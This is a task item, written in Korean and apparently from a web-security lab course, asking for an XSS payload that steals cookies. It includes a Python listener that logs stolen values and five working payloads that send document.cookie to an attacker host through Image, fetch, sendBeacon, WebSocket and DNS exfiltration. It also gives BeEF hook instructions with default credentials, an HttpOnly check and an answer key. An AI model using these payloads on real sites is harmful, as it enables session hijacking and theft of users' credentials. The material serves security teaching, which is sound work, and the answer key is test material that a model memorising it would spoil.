- order: 5
  instruction: |-
    XSS로 쿠키를 탈취하는 페이로드를 작성하시오.

    ■ 실습 방법 (Cookie Stealer 페이로드 + 수신 환경)

    ▶ 1단계: 수신 서버 준비 (학습용 mock)
    ```bash
    # Python 간이 서버 (attacker VM 에서)
    python3 -m http.server 9999 &
    # 또는 더 명확한 로깅
    python3 -c "
    from http.server import HTTPServer, BaseHTTPRequestHandler
    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            print(f'STOLEN: {self.path}')
            self.send_response(200); self.end_headers()
    HTTPServer(('0.0.0.0', 9999), H).serve_forever()
    " &
    ```
    또는 **무료 webhook 서비스**:
    - **webhook.site** — https://webhook.site 가입 → unique URL 발급 → 모든 요청 자동 캡처
    - **requestbin.com** — 동등 기능
    - **interactsh** — projectdiscovery, OOB blind 전용

    ▶ 2단계: 페이로드 작성 (다양한 전송 방식)
    ```javascript
    // 방식 1 — Image (가장 단순, GET, 응답 안 받음)
    <script>new Image().src="http://10.20.30.201:9999/steal?c="+encodeURIComponent(document.cookie)</script>

    // 방식 2 — fetch (응답 받기 가능)
    <script>fetch('http://attacker:9999/steal?c='+document.cookie)</script>

    // 방식 3 — beacon API (페이지 닫혀도 전송)
    <script>navigator.sendBeacon('http://attacker:9999/steal',document.cookie)</script>

    // 방식 4 — WebSocket (양방향, BeEF 같은 C2)
    <script>new WebSocket('ws://attacker:9999/').onopen=function(){this.send(document.cookie)}</script>

    // 방식 5 — DNS exfil (interactsh — 외부 출구만 있어도 OK)
    <script>fetch('http://'+btoa(document.cookie)+'.YOUR.interactsh.com')</script>
    ```

    ▶ 3단계: 도구 A — BeEF (XSS C2 framework, GUI)
    설치:
    ```bash
    # Docker (권장)
    docker run -p 3000:3000 beefproject/beef
    # 또는 git clone https://github.com/beefproject/beef && ./beef
    ```
    사용:
    1. http://attacker:3000/ui/panel (admin/beef)
    2. Hook URL 복사: `<script src="http://attacker:3000/hook.js"></script>`
    3. 피해자 브라우저에 hook 발동 → 1300+ 모듈 (cookie/keylogger/proxy/social) 사용 가능

    ▶ 4단계: 방어 검증
    ```bash
    # HttpOnly 플래그 있으면 document.cookie 접근 X
    curl -sI http://10.20.30.80/ | grep -i 'set-cookie' | grep -i 'httponly'
    # 출력: Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Lax
    ```
    **방어**: HttpOnly + Secure + SameSite=Strict + CSP `script-src 'self'`.

    ▶ 5단계: 답변
    페이로드 1개 quote + 수신 서버 로그 (`STOLEN: /steal?c=...`) quote + HttpOnly 방어.

    **윤리**: 점검 환경 only. 실 사용자 쿠키 탈취는 형법 (정보통신망법 제48조) 위반.
  hint: 'mock 서버 (python -m http.server) / webhook.site / Image/fetch/beacon/WebSocket/DNS / BeEF C2 framework.'
  category: xss_exploit
  points: 10
  answer: echo '<script>new Image().src="http://10.20.30.1:9999/steal?c="+document.cookie</script>'
    && echo '쿠키 탈취 페이로드 작성 완료'
  answer_detail: XSS로 세션 쿠키를 탈취하면 세션 하이재킹이 가능합니다.
